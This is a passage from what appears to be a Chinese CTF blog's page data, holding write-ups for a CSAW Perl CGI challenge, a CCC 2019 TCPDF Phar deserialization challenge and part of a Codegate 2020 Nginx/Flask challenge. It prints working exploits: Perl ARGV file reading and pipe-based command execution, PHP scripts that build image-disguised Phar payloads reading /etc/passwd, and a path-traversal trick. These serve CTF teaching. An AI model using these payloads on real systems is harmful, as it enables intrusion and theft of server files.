class=\"string\">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class=\"string\">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class=\"line\">&lt;html xmlns=<span class=\"string\">&quot;http://www.w3.org/1999/xhtml&quot;</span> lang=<span class=\"string\">&quot;en-US&quot;</span> xml:lang=<span class=\"string\">&quot;en-US&quot;</span>&gt;</span><br><span class=\"line\">  &lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Perl File Upload&lt;/title&gt;</span><br><span class=\"line\">      &lt;meta http-equiv=<span class=\"string\">&quot;Content-Type&quot;</span> content=<span class=\"string\">&quot;text/html; charset=iso-8859-1&quot;</span> /&gt;</span><br><span class=\"line\">    &lt;/head&gt;</span><br><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">    &lt;h1&gt;Perl File Upload&lt;/h1&gt;</span><br><span class=\"line\">    &lt;form method=<span class=\"string\">&quot;post&quot;</span> enctype=<span class=\"string\">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class=\"line\">      File:&lt;input type=<span class=\"string\">&quot;file&quot;</span> name=<span class=\"string\">&quot;file&quot;</span> /&gt;</span><br><span class=\"line\">      &lt;input type=<span class=\"string\">&quot;submit&quot;</span> name=<span class=\"string\">&quot;Submit!&quot;</span> value=<span class=\"string\">&quot;Submit!&quot;</span> /&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">    &lt;hr /&gt;</span><br><span class=\"line\">EndOfHTML</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($cgi-&gt;upload(<span class=\"string\">&#x27;file&#x27;</span>)) &#123;</span><br><span class=\"line\">  my $file = $cgi-&gt;param(<span class=\"string\">&#x27;file&#x27;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (&lt;$file&gt;) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">&quot;$_&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">&quot;&quot;</span>;  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>首先看一下第23行，<code>my $file= $cgi-&gt;param( 'file' )</code>，这里有个问题，Perl的CGI模块有param()方法，用来接收我们传递的参数（POST/GET均可），参考<a href=\"https://metacpan.org/pod/CGI#Fetching-the-names-of-all-the-parameters-passed-to-your-script\">这个</a>，重点是如果我们传入的参数是重复的，例如传入/?a=1&amp;a=2，那么param('a')默认情况下会只返回传入的第一个参数，上例中param('a')返回1（除非用scalar限定返回的是数组，或者用multi_param()方法）。因此，我们在上传文件的时候在正常的文件数据前插入一个name=\"file\"的部分，实际上<span class=\"math inline\">\\(file就会变成我们插入的内容。\\)</span>file可控。</p>\r\n<p>下一个重点是第24行：<code>while (&lt;$file&gt;) &#123;</code>，Perl中<code>&lt;&gt;</code>代表输入输出句柄，具体参考<a href=\"https://perldoc.perl.org/perlop.html\">这里</a>的I/O Operators一节与<a href=\"https://stackoverflow.com/questions/12275408/whats-the-use-of-in-perl\">这里</a>，简单来说，<code>&lt;abc&gt;</code>，代表打开了一个叫做abc的文件，它相当于readline(open(abc))，readline的说明请参考<a href=\"https://perldoc.perl.org/functions/readline.html\">这里</a>。&lt;&gt;中的内容是一个文件句柄，我们直接传入字符串是没有用的，但有几个预置变量除外：STDIN、STDOUT、STDERR与ARGV，我们传入ARGV就会让while循环处理ARGV数组，而ARGV是什么？参考<a href=\"https://perlmaven.com/argv-in-perl\">这个</a>、<a href=\"https://stackoverflow.com/questions/8214996/using-both-argv-and-cgi-in-a-perl-script\">这个</a>与<a href=\"https://metacpan.org/pod/CGI#DEBUGGING\">这个</a>，简单来说就是Perl脚本运行的时候传入的参数，在CGI下还包含传递的GET参数。因此我们如果访问file.pl?/etc/passwd，ARGV就会变成['/etc/passwd']，从而打开/etc/passwd并显示内容。</p>\r\n<p>所以，我们提交file.pl?/flag就可以得到flag了。</p>\r\n<p>还有没有别的方法呢？我们刚才得到flag是基于我们猜到了flag位于根目录，如果不是呢？我们能否通过Perl进行RCE？</p>\r\n<p>答案是可以的，Perl在处理&lt;&gt;的时候会默认调用open()方法，而open()方法可以执行命令，具体参考<a href=\"https://mailman.linuxchix.org/pipermail/courses/2003-September/001344.html\">这个</a>，我们在传入文件名的时候后面加一个<code>|</code>就可以了。Payload如下：</p>\r\n<img src=\"/2019/10/06/CSAW2016-Web-I-Got-ID/Perl_open.png\" class=\"\" title=\"Using open to RCE\">\r\n<p>注意在|前面要有空格。</p>\r\n<p>关于Perl CGI的其他缺点可参考下面的Gist。</p>\r\n<script src=\"//gist.github.com/kentfredric/8f6ed343f4a16a34b08a.js\"></script>\r\n\n    <div id=\"aplayer-GTxBnXfP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"537539\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{41ff23eb-30f9-4fec-aca2-f53a739f0fe2}</p>\r\n","categories":["Writeups"],"tags":["Web","Perl","CGI","Acunetix"]},{"title":"Chaos-Communication-Camp-2019-PDFCreator","url":"/2019/08/29/Chaos-Communication-Camp-2019-PDFCreator/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>一道给了code.zip的题。</p>\r\n<p>打开是个PDF转换网站。我们可以上传一个图片，然后提交生成PDF文件，返回HTML信息。</p>\r\n<p>那么，来看一下源码。index.php中允许我们上传<code>png</code>、<code>jpg</code>、<code>jpeg</code>、<code>gif</code>格式的图片，同时，还使用exif_imagetype()来判断图片格式。最后使用PDFCreator()-&gt;createPdf()来转换PDF文件。同时我们可以得到TCPDF的版本为6.2.13. <a id=\"more\"></a> 网上搜一下TCPDF的漏洞，很容易找到<a href=\"https://packetstormsecurity.com/files/152200/TCPDF-6.2.19-Deserialization-Remote-Code-Execution.html\">这个</a>，一个反序列化导致的RCE，又是<a href=\"https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-1\">Phar反序列化</a>的锅。简单地说，是TCPDF生成PDF文件的时候允许插入HTML代码，例如<code>&lt;link type=\"text/css\" href=\"style.css\"&gt;</code>，但如果恶意修改href参数为<code>phar://</code>，就会触发Phar的反序列化造成RCE。</p>\r\n<p>那么，我们现在需要做的有</p>\r\n<ul>\r\n<li>向PDF文件插入恶意的HTML</li>\r\n<li>准备好符合条件的Phar包</li>\r\n<li>找到Phar的反序列化攻击对象</li>\r\n</ul>\r\n<p>向PDF文件插入HTML，这个很容易办到，在index.php中有如下代码</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&quot;pdfcontent&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t$creator = <span class=\"keyword\">new</span> \\PDFStuff\\PDFCreator();</span><br><span class=\"line\">\t$creator-&gt;createPdf($_POST[<span class=\"string\">&quot;pdfcontent&quot;</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\r\n<p>只要我们提交pdfcontent即可。</p>\r\n<p>将Phar文件注入到正常的图片文件中，参考<a href=\"https://www.nc-lp.com/blog/disguise-phar-packages-as-images?source=post_page-----9c76fd60452d----------------------\">这个</a>。</p>\r\n<p>最后一个问题也是最重要的问题，Phar序列化攻击哪里？在creator.php中有如下代码</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> \\<span class=\"title\">_</span>\\<span class=\"title\">_destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(<span class=\"keyword\">$this</span>-&gt;tmpfile))</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">$info = pathinfo(<span class=\"keyword\">$this</span>-&gt;tmpfile);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($info[<span class=\"string\">&#x27;extension&#x27;</span>] == <span class=\"string\">&quot;pdf&quot;</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tunlink(<span class=\"keyword\">$this</span>-&gt;tmpfile);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;Could not delete created PDF: Not a pdf. Check the file: &quot;</span> . file_get_contents(<span class=\"keyword\">$this</span>-&gt;tmpfile);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\r\n<p>__destruct会在类销毁时自动调用，而它会调用file_get_contents()进行读文件。</p>\r\n<p>那么，生成Phar包的代码如下：</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$jpeg_header_size = </span><br><span class=\"line\"><span class=\"string\">&quot;\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46\\x00\\x01\\x01\\x01\\x00\\x48\\x00\\x48\\x00\\x00\\xff\\xfe\\x00\\x13&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\x43\\x72\\x65\\x61\\x74\\x65\\x64\\x20\\x77\\x69\\x74\\x68\\x20\\x47\\x49\\x4d\\x50\\xff\\xdb\\x00\\x43\\x00\\x03\\x02&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\x02\\x03\\x02\\x02\\x03\\x03\\x03\\x03\\x04\\x03\\x03\\x04\\x05\\x08\\x05\\x05\\x04\\x04\\x05\\x0a\\x07\\x07\\x06\\x08\\x0c\\x0a\\x0c\\x0c\\x0b\\x0a\\x0b\\x0b\\x0d\\x0e\\x12\\x10\\x0d\\x0e\\x11\\x0e\\x0b\\x0b\\x10\\x16\\x10\\x11\\x13\\x14\\x15\\x15&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\x15\\x0c\\x0f\\x17\\x18\\x16\\x14\\x18\\x12\\x14\\x15\\x14\\xff\\xdb\\x00\\x43\\x01\\x03\\x04\\x04\\x05\\x04\\x05\\x09\\x05\\x05\\x09\\x14\\x0d\\x0b\\x0d\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\xff\\xc2\\x00\\x11\\x08\\x00\\x0a\\x00\\x0a\\x03\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\xff\\xc4\\x00\\x15\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\xff\\xc4\\x00\\x14\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xda\\x00\\x0c\\x03&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\x01\\x00\\x02\\x10\\x03\\x10\\x00\\x00\\x01\\x95\\x00\\x07\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x05\\x02\\x1f\\xff\\xc4\\x00\\x14\\x11&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\xff\\xda\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x06\\x3f\\x02\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x21\\x1f\\xff\\xda\\x00\\x0c\\x03\\x01\\x00\\x02\\x00\\x03\\x00\\x00\\x00\\x10\\x92\\x4f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda&quot;</span>.</span><br><span class=\"line\"><span class=\"string\">&quot;\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x10\\x1f\\xff\\xd9&quot;</span>;</span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\">$phar-&gt;startBuffering();</span><br><span class=\"line\">$phar-&gt;addFromString(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">$phar-&gt;setStub($jpeg_header_size.<span class=\"string\">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class=\"line\">$o = <span class=\"keyword\">new</span> \\PDFStuff\\PDFCreator();</span><br><span class=\"line\">$o-&gt;tmpfile = <span class=\"string\">&quot;/etc/passwd&quot;</span>;</span><br><span class=\"line\">$phar-&gt;setMetadata($o);</span><br><span class=\"line\">$phar-&gt;stopBuffering();</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>运行后会在当前目录生成phar.phar，我们将其改名为aaa.jpeg，正常上传。然后我们在下面的HTML区域提交<code>&lt;html&gt;&lt;link type=\"text/css\" href=\"phar://./upload/098f6bcd4621d373cade4e832627b4f6.jpeg\"&gt;hello&lt;/link&gt;&lt;/html&gt;</code>即可。（文件名自己换）</p>\r\n<p>然后就怎么都没打通，查了半天原因，发现源码中的PDFCreator类是属于PDFStuff命名空间下的，因此我们同样需要在PDFStuff的命名空间下生成Phar。</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">PDFStuff</span> &#123;</span><br><span class=\"line\">    <span class=\"title\">class</span> <span class=\"title\">PDFCreator</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        public $tmpfile = &quot;/etc/nginx/nginx.conf&quot;;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $finalfile;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $phar = <span class=\"keyword\">new</span> \\Phar(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\">    $phar-&gt;startBuffering();</span><br><span class=\"line\">    $phar-&gt;addFromString(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">    $phar-&gt;setStub(<span class=\"string\">&quot;GIF89a&quot;</span> . <span class=\"string\">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class=\"line\">    $o = <span class=\"keyword\">new</span> PDFCreator();</span><br><span class=\"line\">    $phar-&gt;setMetadata($o);</span><br><span class=\"line\">    $phar-&gt;stopBuffering();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>注意Phar需要使用<code>\\Phar</code>，因为Phar类是在根命名空间下的。</p>\r\n<p>上传后提交。在返回的页面中出现了/etc/nginx/nginx.conf的内容，我们知道webroot在/var/www/site/下，那么我们直接读/var/www/site/flag.php即可得到flag。</p>\r\n<p>P.S. 如果不手动声明namespace，我们还可以直接include creator.php，即PoC如下： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;creator.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    $phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\">    $phar-&gt;startBuffering();</span><br><span class=\"line\">    $phar-&gt;addFromString(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">    $phar-&gt;setStub(<span class=\"string\">&quot;GIF89a&quot;</span> . <span class=\"string\">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class=\"line\">    $o = <span class=\"keyword\">new</span> \\PDFStuff\\PDFCreator();</span><br><span class=\"line\">    $o-&gt;tmpfile=<span class=\"string\">&quot;/etc/nginx/nginx.conf&quot;</span>;</span><br><span class=\"line\">    $phar-&gt;setMetadata($o);</span><br><span class=\"line\">    $phar-&gt;stopBuffering();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\r\n\n    <div id=\"aplayer-kOrUIEtO\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"30967419\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{f7a40718-9e36-436a-bc1f-ccbd898e918c}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web","Phar","TCPDF"]},{"title":"Codegate CTF 2020 Preliminary renderer","url":"/2020/03/07/Codegate-2020-renderer/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>Codegate CTF 2020的renderer。给了Description:</p>\r\n<div class=\"note \"><p>It is my first flask project with nginx. Write your own message, and get flag!</p>\r\n<p>http://XXXXXXX/renderer</p>\r\n</div>\r\n<p>同时给了两个附件：</p>\r\n<figure class=\"highlight bash\"><figcaption><span>settings/run.sh</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">service nginx stop</span><br><span class=\"line\">mv /etc/nginx/sites-enabled/default /tmp/</span><br><span class=\"line\">mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flask</span><br><span class=\"line\"></span><br><span class=\"line\">service nginx restart</span><br><span class=\"line\"></span><br><span class=\"line\">uwsgi /home/src/uwsgi.ini &amp;</span><br><span class=\"line\">/bin/bash /home/cleaner.sh &amp;</span><br><span class=\"line\"></span><br><span class=\"line\">/bin/bash</span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight dockerfile\"><figcaption><span>Dockerfile</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> python:<span class=\"number\">2.7</span>.<span class=\"number\">16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">ENV</span> FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> apt-get update</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> apt-get install -y nginx</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> pip install flask uwsgi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">ADD</span><span class=\"bash\"> prob_src/src /home/src</span></span><br><span class=\"line\"><span class=\"keyword\">ADD</span><span class=\"bash\"> settings/nginx-flask.conf /tmp/nginx-flask.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">ADD</span><span class=\"bash\"> prob_src/static /home/static</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> chmod 777 /home/static</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> mkdir /home/tickets</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> chmod 777 /home/tickets</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">ADD</span><span class=\"bash\"> settings/run.sh /home/run.sh</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> chmod +x /home/run.sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">ADD</span><span class=\"bash\"> settings/cleaner.sh /home/cleaner.sh</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> chmod +x /home/cleaner.sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"bash\"> [<span class=\"string\">&quot;/bin/bash&quot;</span>, <span class=\"string\">&quot;/home/run.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>\r\n<p>上来注意到的是给的是/renderer，而不是只有一个IP地址。直接访问IP地址后发现是Nginx服务器。那么很容易想到Nginx的不当配置导致<a href=\"https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html\">路径穿越</a>。打开页面后提示是个Proxy Server，SSRF没跑了。查看网页源代码发现引用了/static/css/renderer.css，那么我们试着访问/static../，果然路径穿越了，这样我们就可以扒下来所有源码了。 <figure class=\"highlight ini\"><figcaption><span>/home/src/uwsgi.ini</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[uwsgi]</span></span><br><span class=\"line\"><span class=\"attr\">chdir</span> = /home/src/</span><br><span class=\"line\"><span class=\"attr\">module</span> = run</span><br><span class=\"line\"><span class=\"attr\">callable</span> = app</span><br><span class=\"line\"><span class=\"attr\">processes</span> = <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"attr\">uid</span> = www-data</span><br><span class=\"line\"><span class=\"attr\">gid</span> = www-data</span><br><span class=\"line\"><span class=\"attr\">socket</span> = /tmp/renderer.sock</span><br><span class=\"line\"><span class=\"attr\">chmod-socket</span> = <span class=\"number\">666</span></span><br><span class=\"line\"><span class=\"attr\">vacuum</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">daemonize</span> = /tmp/uwsgi.log</span><br><span class=\"line\"><span class=\"attr\">die-on-term</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">pidfile</span> = /tmp/renderer.pid</span><br></pre></td></tr></table></figure> <figure class=\"highlight python\"><figcaption><span>/home/src/run.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    <span class=\"comment\">#TODO : disable debug</span></span><br><span class=\"line\">    app.run(debug=<span class=\"literal\">False</span>, host=<span class=\"string\">&quot;0.0.0.0&quot;</span>, port=<span class=\"number\">8080</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure> <figure class=\"highlight python\"><figcaption><span>/home/src/app/routes.py</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> print_function</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, render_template, render_template_string, request, redirect, abort, Blueprint</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib2</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> os <span class=\"keyword\">import</span> path</span><br><span class=\"line\"><span class=\"keyword\">from</span> urlparse <span class=\"keyword\">import</span> urlparse</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">front = Blueprint(<span class=\"string\">&quot;renderer&quot;</span>, __name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@front.before_request</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">test</span>():</span></span><br><span class=\"line\">    print(<span class=\"string\">&#x27;!!!!&#x27;</span>, request.url, file=sys.stderr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@front.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&quot;GET&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    url = request.form.get(<span class=\"string\">&quot;url&quot;</span>)</span><br><span class=\"line\">    res = proxy_read(url) <span class=\"keyword\">if</span> url <span class=\"keyword\">else</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> res:</span><br><span class=\"line\">        abort(<span class=\"number\">400</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>, data = res)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@front.route(&quot;/whatismyip&quot;, methods=[&quot;GET&quot;])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ipcheck</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;ip.html&quot;</span>, ip = get_ip(), real_ip = get_real_ip())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@front.route(&quot;/admin&quot;, methods=[&quot;GET&quot;])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">admin_access</span>():</span></span><br><span class=\"line\">    ip = get_ip()</span><br><span class=\"line\">    rip = get_real_ip()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ip <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> [<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"string\">&quot;127.0.0.2&quot;</span>]: <span class=\"comment\">#super private ip :)</span></span><br><span class=\"line\">        abort(<span class=\"number\">403</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> ip != rip: <span class=\"comment\">#if use proxy</span></span><br><span class=\"line\">        ticket = write_log(rip)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;admin_remote.html&quot;</span>, ticket = ticket)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ip == <span class=\"string\">&quot;127.0.0.2&quot;</span> <span class=\"keyword\">and</span> request.args.get(<span class=\"string\">&quot;body&quot;</span>):</span><br><span class=\"line\">            ticket = write_extend_log(rip, request.args.get(<span class=\"string\">&quot;body&quot;</span>))</span><br><span class=\"line\">            <span 